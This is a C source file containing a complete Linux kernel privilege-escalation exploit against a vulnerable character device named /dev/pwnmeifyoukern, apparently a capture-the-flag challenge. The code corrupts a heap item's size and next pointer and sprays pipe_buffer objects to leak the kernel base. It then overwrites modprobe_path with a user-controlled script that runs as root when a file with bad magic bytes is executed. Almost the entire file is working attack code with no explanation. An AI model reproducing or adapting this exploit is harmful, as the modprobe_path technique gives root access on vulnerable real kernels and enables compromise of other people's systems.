#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdint.h>

#define err(msg) do { perror(msg); exit(-1); } while (0);

#define BUF_SIZE 0x1000
#define NUM_PIPEFDS 0x1

int fd;

struct arg_new {
	int new_item;
	char buf[0];
};

struct arg_edit {
	int new_item;
	int idx;
	char buf[0];
};

void hex_view(char *buf, size_t size) {
	for (int i = 0; i < size; i++) {
		if ((i % 0x10) == 0) {
			printf("%08x:", i);
		}
		printf(" %02hhx", buf[i]);
		if ((i % 0x10) == 0xf) {
			printf("\n");
		}
	}
	printf("\n");
}

void new_item(char *buf, size_t size) {
	struct arg_new *arg = calloc(1, sizeof(struct arg_new) + size);
	arg->new_item = 1;
	memcpy(arg->buf, buf, size);

	//hex_view(arg, sizeof(struct arg_new) + size);
	if (-1 == write(fd, arg, sizeof(struct arg_new) + size)) {
		err("write new item");
	}

	free(arg);
}

void edit_item(int idx, char *buf, size_t size) {
	struct arg_edit *arg = calloc(1, sizeof(struct arg_edit) + size);
	arg->new_item = 0;
	arg->idx = idx;
	memcpy(arg->buf, buf, size);

	//hex_view(arg, sizeof(struct arg_edit) + size);
	if (-1 == write(fd, arg, sizeof(struct arg_edit) + size)) {
		err("write edit item");
	}

	free(arg);
}



int main() {
	char *buf = malloc(BUF_SIZE);
	void *leak, *kbase, *modprobe_path;
	int n;
	char bak[0x400] = {0};
	int pipefd[NUM_PIPEFDS][2];

	fd = open("/dev/pwnmeifyoukern", O_RDWR);
	if (-1 == fd) {
		err("open");
	}

	memset(buf, 'A', BUF_SIZE);
	new_item(buf, 0x100); // A

	// change A.size
	memset(buf, 0, BUF_SIZE);
	memset(buf, 'A', 0x100);
	*(unsigned long long *)(buf + 0x100) = 0x1337; // size (will be overwritten)
	*(unsigned long long *)(buf + 0x108) = NULL;  // next
	edit_item(0, buf, 0x400+0x30); // new size


	// spray with pipe_buffer
	// https://github.com/google/security-research/blob/master/pocs/linux/cve-2021-22555/exploit.c
	printf("[*] Spraying pipe_buffer objects...\n");
	for (int i = 0; i < NUM_PIPEFDS; i++) {
		if (pipe(pipefd[i]) < 0) {
			err("pipe");
		}
		// Write something to populate pipe_buffer.
		if (write(pipefd[i][1], "pwn", 3) < 0) {
			err("pipe write");
		}
	}


	// read A and leak pipe_buffer.ops
	memset(buf, 0, BUF_SIZE);
	n = read(fd, buf, 0x400 + 0x30);
	if (-1 == n) {
		err("read");
	}
	//hex_view(buf, n);

	leak = *(unsigned long long *)(buf + 0x400 + 0x10);
	kbase = leak - (0xffffffffa8210840 - 0xffffffffa7a00000);
	modprobe_path = kbase + (0xffffffff89251a00 - 0xffffffff88800000);

	printf("[+] pipe_buffer.ops = %p\n", leak);
	printf("[+] kbase = %p\n", kbase);
	printf("[+] modprobe_path @ %p\n", modprobe_path);


	memset(buf, 'A', BUF_SIZE);
	new_item(buf, 0x100); // B -> A
	

	// B.next = modprobe_path
	memset(buf, 0, BUF_SIZE);
	*(unsigned long long *)(buf + 0x108) = modprobe_path;
	edit_item(0, buf, 0x110);

	// leak [modprobe_path; modprobe_path + 0x108] to prevent panic
	memset(bak, 0, sizeof(bak));
	n = read(fd, bak, 0x110 + 0x108);
	if (-1 == n) {
		err("read");
	}
	//hex_view(bak, n);

	// overwrite modprobe_path
	strncpy(buf, "/home/user/pld", BUF_SIZE);
	edit_item(1, buf, strlen(buf) + 1);

	// B.next = modprobe_path + 0x20
	memset(buf, 0, BUF_SIZE);
	*(unsigned long long *)(buf + 0x108) = modprobe_path + 0x20;
	edit_item(0, buf, 0x110);

	// prevent panic
	memmove(bak, bak+0x110+0x20, 0x108-0x20);
	edit_item(1, bak, 0x108-0x20);


	puts("[+] getting a shell :)");
	system("echo '#!/bin/sh\nchmod -R 777 /passwd' > /home/user/pld");
	system("echo -e '\xef\xbe\xad\xde' > /home/user/x");
	system("chmod 777 /home/user/pld /home/user/x");
	system("/home/user/x");

	close(fd);

	return 0;
}
